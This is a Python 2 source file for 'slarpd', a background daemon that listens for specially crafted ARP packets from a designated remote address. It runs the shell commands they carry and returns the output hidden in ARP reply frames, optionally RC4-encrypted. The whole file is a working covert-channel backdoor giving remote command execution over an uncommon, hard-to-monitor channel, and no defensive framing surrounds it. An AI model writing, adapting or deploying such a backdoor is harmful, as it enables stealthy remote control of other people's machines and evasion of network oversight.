from sys import exit
from struct import pack, unpack
from commands import getoutput
from fcntl import ioctl
from base64 import b64encode, b64decode
from getpass import getpass
from argparse import ArgumentParser
from os import fork
import socket

""" implements the slarpd daemon. All
    exceptions silently kill the daemon, though it has
    been built to be as robust and resilient as possible.

    Only standard py2.7 libs have been used for portability.
"""


class slarpd:
    def __init__(self):
        self.adapter = None
        self.remote = None
        self.remote_mac = None
        self.host = None
        self.host_mac = None

        self.encrypt = False
        self.crypto = crypto()

    def mac_bytes(self, mac):
        """Packs a MAC up"""
        bmac = ''
        while len(mac) < 12:
            mac = mac + '0'
        for idx in range(0, 12, 2):
            m = int(mac[idx:idx + 2], 16)
            bmac += pack('!B', m)
        return bmac

    def respond(self, data):
        """Send [data] back to the remote host"""
        try:
            if len(data) > 900:
                data = "Response too long; fragmentation not yet supported."
            if self.encrypt:
                data = self.crypto.rc4.encrypt(data)
            arpf = [self.mac_bytes(self.remote_mac), self.mac_bytes(self.host_mac),
                        pack('!H',0x0806),
                     pack('!HHBB',0x0001,0x0800,0x0006,0x0004),
                     pack('!H',0x0002), self.mac_bytes(self.host_mac),
                     pack('!4B',*[int(x) for x in self.host.split('.')]),
                     self.mac_bytes(self.remote_mac),
                     pack('!4B',*[int(x) for x in self.remote.split('.')]),
                     data
                ]
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
            sock.bind((self.adapter, socket.SOCK_RAW))
            sock.send(''.join(arpf))
            sock.close()
        except Exception, e:
            print e

    def handle(self, data):
        """Handle the command"""
        if self.encrypt:
            data = self.crypto.rc4.decrypt(data)
        if data[0] == '1':
            response = getoutput(data[1:])
            self.respond(response)
        elif data[0] == '3':
            exit(1)
        else:
            return

    def sender_ip(self, data):
        """Unpack the source IP address"""
        ip = unpack('!4s', data[28:32])
        return socket.inet_ntoa(ip[0])

    def local_mac(self, ifname):
        """Obtain local adapter's MAC; uuid mod is stupid."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = ioctl(sock.fileno(), 0x8927, pack('256s', ifname[:15]))
        return ''.join(['%02x' % ord(char) for char in info[18:24]])[:-1]

    def local_ip(self, ifname):
        """Obtain local adapter's IP"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = ioctl(sock.fileno(), 0x8915, pack('256s', ifname[:15]))[20:24]
        return socket.inet_ntoa(info)

    def sender_mac(self, data):
        """Unpack the source MAC"""
        return "%02x%02x%02x%02x%02x%02x" % unpack('BBBBBB', data[6:12])

    def sniff(self):
        """Sniff raw ARP packets"""
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0806))
            while True:
                data = sock.recv(512)
                if self.sender_ip(data) == self.remote and data[42] != '\x00':
                    self.remote_mac = self.sender_mac(data)
                    self.handle(data[42:].replace('\x00', ''))
        except Exception, e:
            print e

    def initialize(self, adapter):
        self.adapter = adapter
        self.host_mac = self.local_mac(adapter)
        self.host = self.local_ip(adapter)
        self.sniff()


class crypto:
    """Handles cryptographic stuff"""
    def __init__(self):
        self.rc4 = self.RC4()

    class RC4:
        def __init__(self):
            self.key = None

        def crypt(self, data):
            x = 0
            box = range(256)
            for i in range(256):
                x = (x + box[i] + ord(self.key[i % len(self.key)])) & 0xff
                box[i], box[x] = box[x], box[i]
            x = y = 0
            out = []
            for char in data:
                x = (x + 1) & 0xff
                y = (y + box[x]) & 0xff
                box[x], box[y] = box[y], box[x]
                out.append(chr(ord(char) ^ box[(box[x] + box[y]) & 0xff]))
            return ''.join(out)

        def encrypt(self, data):
            if self.key is None:
                return None
            return b64encode(self.crypt(data))

        def decrypt(self, data):
            if self.key is None:
                return None
            return self.crypt(b64decode(data))


if __name__ == "__main__":
    tmp = slarpd()
    parser = ArgumentParser()
    parser.add_argument('-r', help='remote address', action='store', dest='remote')
    parser.add_argument('-P', help='encryption flag', action='store_true', dest='encrypt')
    parser.add_argument('-a', help='network adapter', action='store', dest='net')
    parser.add_argument('-k', help='kill a running daemon', action='store_true', dest='kill')

    options = parser.parse_args()
    if options.kill:
        getoutput('kill -s 9 `pgrep -u root -f "slarpd"`')
        exit(1)
    if options.encrypt:
        tmp.crypto.rc4.key = getpass('[!] Encryption password: ')
        tmp.encrypt = True

    if options.remote:
        tmp.remote = options.remote
    else:
        parser.print_help()
        exit(1)

    if options.net:
        adapter = options.net
    else:
        adapter = getoutput('ifconfig | awk \'{print $1}\' | head -n 1')

    print 'daemon running with adapter %s, going into hibernate mode...' % adapter
    if fork():
        exit(1)
    tmp.initialize(adapter)
